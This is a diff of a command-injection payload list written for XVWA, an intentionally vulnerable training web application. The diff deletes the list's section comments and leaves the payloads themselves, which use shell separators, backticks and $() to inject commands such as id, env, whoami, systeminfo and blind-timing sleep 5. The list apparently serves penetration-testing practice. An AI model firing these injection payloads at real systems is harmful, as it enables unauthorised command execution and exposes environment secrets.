@@ -1,5 +1,3 @@
-# Command Injection payloads optimized for XVWA
-# Linux command injection payloads that work on XVWA
 ; id
 | id
 & id
@@ -56,8 +54,6 @@ $(pwd)
 || env
 `env`
 $(env)
-
-# Windows command injection payloads that work on XVWA
 & whoami
 && whoami
 | whoami
@@ -93,8 +89,6 @@ $(env)
 | systeminfo
 || systeminfo
 ; systeminfo
-
-# Blind command injection payloads for XVWA
 ; sleep 5
 | sleep 5
 & sleep 5
